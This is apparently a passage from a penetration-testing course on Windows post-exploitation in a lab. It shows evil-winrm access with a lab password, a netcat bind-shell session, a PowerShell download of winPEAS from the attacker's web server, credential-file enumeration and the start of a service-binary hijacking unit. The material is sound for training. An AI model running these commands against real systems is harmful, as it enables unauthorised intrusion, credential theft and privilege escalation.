### Optimized Text

#### Using `evil-winrm` for Remote Connection
The `evil-winrm` tool is primarily used for hash, in-memory loading, and file upload/download operations. However, we will use it to connect to the target system via WinRM to avoid issues encountered when creating a PowerShell remoting session in our bind shell, as shown in Listing 402.

To connect, we need to provide the IP address with the `-i` flag, the username with the `-u` flag, and the password with the `-p` flag. If the password contains special characters like `!`, they must be escaped.

```bash
kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

**Output:**
```
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation:
quoting_detection_proc() function is unimplemented on this machine
For more information, check Evil-WinRM GitHub:
https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin
*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\
*Evil-WinRM* PS C:\> dir
Directory: C:\
Mode LastWriteTime Length Name
---- ------------- ------ ----
d----- 6/5/2021 5:10 AM PerfLogs
d-r--- 7/20/2022 1:14 AM Program Files
d-r--- 6/5/2021 7:37 AM Program Files (x86)
d----- 7/4/2022 1:00 AM tools
d-r--- 6/23/2022 8:12 AM Users
d----- 7/20/2022 8:07 AM Windows
d----- 6/16/2022 1:17 PM xampp
```

**Listing 403:** Using `evil-winrm` to connect to CLIENTWK220 as `daveadmin`

As shown in Listing 403, we can now execute commands without any issues. This is a significant improvement over previous methods.

#### PowerShell Artifacts and Transcriptions
PowerShell artifacts, such as the history file of `PSReadline` or transcript files, often contain valuable information. It is crucial to review these files, as administrators may clear their history using `Clear-History`, leaving the `PSReadline` history untouched for analysis.

Administrators can prevent `PSReadline` from recording commands by setting the `HistorySaveStyle` option to `SaveNothing` using the `Set-PSReadlineOption` cmdlet. Alternatively, they can manually clear the history file.

In this section, we explored PowerShell transcriptions as powerful mechanisms to record commands and scripts. We also discussed where PowerShell saves its history and used this knowledge to obtain passwords for another system and the administrative user `daveadmin`.

#### Automated Enumeration
In the previous sections, we manually enumerated CLIENTWK220, which was time-consuming. In real-world penetration tests, time constraints often limit manual enumeration. Therefore, automated tools like `winPEAS` are essential.

**Automated Tools:**
- **winPEAS**: Enumerates the target machine and provides situational awareness and sensitive information.
- **Seatbelt**: Another tool for enumeration.
- **JAWS**: Yet another tool for enumeration.

If an automated tool is blocked by antivirus solutions, you can apply techniques learned in the "Antivirus Evasion" module or use alternative tools.

**Example: Using winPEAS**
1. Copy the 64-bit binary to your home directory.
2. Start a Python3 web server to serve the binary.

```bash
kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe .
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Listing 404:** Copy `winPEAS` to the home directory and start a Python3 web server.

Connect to the bind shell running on port 4444 at CLIENTWK220 as user `dave`. Use the `Invoke-WebRequest` (iwr) cmdlet to download the `winPEAS` binary.

```powershell
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.
C:\Users\dave> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Users\dave> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

**Listing 405:** Connect to the bind shell and transfer the `winPEAS` binary to CLIENTWK220.

Run the `winPEAS` program and review the output legend, which categorizes results in different colors:

- **Red**: Indicates a special privilege or misconfiguration.
- **Green**: Indicates that some protection is enabled or well-configured.
- **Cyan**: Indicates active users.
- **Blue**: Indicates disabled users.
- **LightYellow**: Indicates links.

**Listing 406:** Output legend of `winPEAS`.

Review the basic system information provided by `winPEAS`:

```
Basic System Information
Hostname: clientwk220
ProductName: Windows 10 Pro
EditionID: Professional
ReleaseId: 2009
BuildBranch: co_release
CurrentMajorVersionNumber: 10
CurrentVersion: 6.3
Architecture: AMD64
ProcessorCount: 2
SystemLang: en-US
KeyboardLang: English (United States)
TimeZone: (UTC-08:00) Pacific Time (US & Canada)
IsVirtualMachine: True
Current Time: 6/23/2022 2:30:36 PM
HighIntegrity: False
PartOfDomain: False
Hotfixes: ...
```

**Listing 407:** Basic System Information of `winPEAS`.

Next, `winPEAS` provides information about security protections, PowerShell, and NTLM settings. For example, it lists transcript files, though the list may be empty. Manual verification is always recommended.

**Listing 408:** List of transcript files.

**User Information:**

```
Users
...
Current user: dave
Current groups: Domain Users, Everyone, helpdesk, Builtin\Remote Desktop Users, Users, Batch, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
CLIENTWK220\Administrator(Disabled): Built-in account for administering the computer/domain
|->Groups: Administrators
|->Password: CanChange-NotExpi-Req
CLIENTWK220\BackupAdmin
|->Groups: BackupUsers,Administrators,Users
|->Password: CanChange-NotExpi-Req
CLIENTWK220\dave: dave
|->Groups: helpdesk,Remote Desktop Users,Users
|->Password: CanChange-NotExpi-Req
CLIENTWK220\daveadmin
|->Groups: adminteam,Administrators,Remote Management Users,Users
|->Password: CanChange-NotExpi-Req
...
CLIENTWK220\steve
|->Groups: helpdesk,Remote Desktop Users,Remote Management Users,Users
|->Password: CanChange-NotExpi-Req
...
```

**Listing 409:** User information.

**Possible Password Files:**

```
Looking for possible password files in users homes
...
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
C:\Users\dave\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
...
```

**Listing 410:** Possible password files in the home directory of `dave`.

While `winPEAS` provided extensive information, it incorrectly identified the target as Windows 10 and missed some key files. Therefore, while automated tools are essential, they should be complemented with manual verification.

### Leveraging Windows Services

This learning unit covers the following objectives:
- Hijacking service binaries
- Hijacking service DLLs
- Abusing unquoted service paths

A Windows Service is a long-running background executable managed by the Service Control Manager, similar to daemons on Unix systems. Windows services can be managed via the Services snap-in, PowerShell, or the `sc.exe` command-line tool. They run under accounts like LocalSystem, Network Service, or Local Service.

#### Service Binary Hijacking
Each Windows service has an associated binary file. If a software developer creates a program and installs it as a Windows service without securing permissions, a lower-privileged user could replace the binary with a malicious one. This malicious binary would then be executed with the privileges of the service, such as LocalSystem.

**Example:**
1. Connect to CLIENTWK220 as `dave` over RDP with the password `qwertqwertqwert123`.
2. Use the `Get-CimInstance` cmdlet to query the WMI class `win32_service` and filter out services not in the Running state.

```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Name State PathName
---- ----- --------
Apache2.4 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BFE Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
...
```

**Note:** When using a network logon such as WinRM or a bind shell, `Get-CimInstance` and `Get-Service` may result in a "permission denied" error for non-administrative users. Using an interactive logon such as RDP resolves this issue.